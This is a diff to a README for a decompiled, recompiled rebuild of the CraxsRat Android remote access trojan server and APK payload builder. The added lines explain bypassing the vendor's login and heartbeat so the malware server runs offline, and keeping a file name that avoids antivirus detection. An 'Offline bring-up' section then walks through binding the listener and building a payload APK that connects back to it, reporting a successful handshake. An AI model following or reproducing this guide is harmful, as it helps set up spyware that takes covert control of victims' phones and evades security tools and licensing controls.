@@ -28,7 +28,7 @@ dotnet build Cobra.csproj
 
 Output: `bin\Debug\net48\CraxsRat.exe` (~64.8 MB — most of the mass is the embedded APK stub `MYSTUB`/`MYSTUBTEN`, the Android build toolchain, and `platformBinary.zip` used to rebuild/sign APKs).
 
-To **run**, the app expects the `res\` folder from the original package next to the exe (fonts, GeoIP databases, icons, `Lib\` build toolchain). Copy `res\` from the original distribution.
+To **run**, the app expects the `res\` folder from the original package next to the exe (fonts, GeoIP databases, icons, `Lib\` build toolchain). Copy `res\` from the original distribution. The vendor login and heartbeat are bypassed so the server stays up offline; see [Offline bring-up](#offline-bring-up). Java is required only when building an APK.
 
 ## Source layout (mirrors the original VB.NET project)
 
@@ -127,7 +127,21 @@ ILSpy's VB.NET → C# output needed these corrections to compile:
 1. `ResizeableControl.mControl` and `alertform.pictureBox2`: removed illegal `private virtual`
 2. `GetCountryName.GetCountryName()`: renamed method to `Lookup()` (C# forbids member name == type name) and updated call sites
 3. `CustomFont.LoadFont` / `CustomFontDrawString.LoadFont`: decompiled as parameterless properties but called with `(name, size, style)` — restored as static methods with parameters
-4. csproj: retargeted `net45` → `net48` (matches the original's `.netframework,version=v4.8` assembly attributes found in the PDB), added `System.Resources.Extensions` package + `GenerateResourceUsePreserializedResources` for the large resx resources, added WPF references (`PresentationFramework`, `WindowsBase`) for the LiveCharts `GeoMap`, and pointed all dependency `HintPath`s at `libs\` (`WinMM.Net.dll` is stored as `WinMM.dll` because the `.Net` suffix triggers some AV scanners on copy — its assembly name is still `WinMM.Net`).
+4. csproj: retargeted `net45` → `net48` (matches the original's `.netframework,version=v4.8` assembly attributes found in the PDB), added `System.Resources.Extensions` package + `GenerateResourceUsePreserializedResources` for the large resx resources, added WPF references (`PresentationFramework`, `WindowsBase`) for the LiveCharts `GeoMap`, and pointed all dependency `HintPath`s at `libs\`.
+5. `Cobra.csproj` copies `libs\WinMM.dll` into the output as `WinMM.Net.dll`. Startup (`reso.MY_Path`) and the CLR binder both require that exact file name. The in-tree name stays `WinMM.dll` because the `.Net` suffix trips some AV scanners; the assembly name is still `WinMM.Net`.
+6. `Ports.b_ok_Click` no longer starts `loginworker`. The original worker calls `craxsrat.vip` for auth and an update check, which fails offline and leaves the dialog open. The click now sets `Finish` and fills `statuslabel` so `Ports.Timer1_Tick` closes the dialog. Turning a port **ON** still requires a connection password longer than 3 characters; that value is written to `res\Config\Pass.inf`.
+7. `Pass.inf` is resolved from `reso.res_Path` (the exe folder) in both `Data`'s static init and the saved-password load in `CraxsRatMain`. `Environment.CurrentDirectory` missed `res\` when the process was not started from the output folder, and the missing-file handler then crashed because `res\Config` did not exist. The directory is created before the sentinel file is written.
+8. `CraxsRatMain.Timer1_Tick` no longer calls `Environment.Exit(0)`. The timer runs every 60 seconds and calls `Codes.Apihear` (the vendor heartbeat). With that API gone, `xt_err` climbed by one per tick and the process exited on the sixth failure — which also skipped `FormEventArgsClosing`, the only place the port list is saved. The counter now resets instead.
+
+## Offline bring-up
+
+Checked on 22 Nov 2026 against the fixes above: `dotnet build Cobra.csproj` completes with 0 errors, and a payload produced by this server's own builder completed a TCP handshake back to it.
+
+The listener does not bind just because a port is listed. `CraxsRatMain_Load` splits the `ports` user setting on `>` and adds each row as **OFF**. Click that row's switch to construct `Accept`, which binds `TcpListener` on `IPAddress.Any`. Windows Firewall may prompt on the first bind. A normal window close writes the port list back; the old heartbeat `Environment.Exit(0)` skipped that save.
+
+For an Android emulator, the host address is `10.0.2.2`, not the machine's LAN address. The builder records the chosen host and port in `output\info.inf`. The checked build was `targetSdkVersion` 29 / `minSdkVersion` 21 (`platformBuildVersionName` 11) aimed at `10.0.2.2:4444`. While `CraxsRat.exe` listened on `0.0.0.0:4444`, the guest socket moved from `SYN_SENT` to `ESTABLISHED`.
+
+If the builder stalls inside apktool with a `NullPointerException` in `AndroidManifestResourceParser`, `%LOCALAPPDATA%\apktool\framework\1.apk` is a truncated framework cache. Replace it with a complete `framework-res.apk` pulled from the same emulator image (`/system/framework/framework-res.apk`).
 
 ## Runtime requirements
 
